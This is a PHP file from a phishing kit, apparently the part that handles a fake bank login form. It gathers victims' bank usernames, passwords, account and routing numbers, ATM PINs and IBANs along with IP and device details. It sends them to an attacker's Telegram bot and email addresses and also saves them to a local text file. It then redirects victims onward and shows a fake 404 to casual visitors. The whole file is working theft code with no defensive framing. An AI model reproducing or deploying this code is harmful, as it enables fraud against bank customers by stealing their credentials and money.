<?php
/*
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |TND95| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
*/
    if(isset($_POST['accnumq'])){
	session_start();
	include '../mine.php';
	include '../bot.php';
	$msg="=========== <[ -".$scamname."- BANK INF0 ]> ===========\r\n";
	$msg.="EMAIL				: {$_SESSION['EML']}\r\n";
	$msg.="Account Username	: {$_POST['userid']}\r\n";
	$msg.="Account Pass		: {$_POST['passcode']}\r\n";
	$msg.="Account Number		: {$_POST['accnumq']}\r\n";
	$msg.="Routing Number		: {$_POST['rounum']}\r\n";
	$msg.="ATM PIN				: {$_POST['atmpin']}\r\n";
	if(isset($_POST['iban'])){
    $msg.="IBAN: {$_POST['iban']}\r\n";
	}
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ INF ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );


	$subject="-".$scamname."- NEW BANK INF0 [".$_SESSION['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: TND  <newlogin@tnd.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
			@mail($nobot,$subject,$msg,$headers);
	}
	}
		if ($show_identity=="yes") {
exit(header("Location: ../../app/identity"));
}else{
    exit(header("Location: ../../app/thanks"));
}
}
if(!isset($_POST['accnumq'])){
     header('HTTP/1.0 404 Not Found');
}
	?>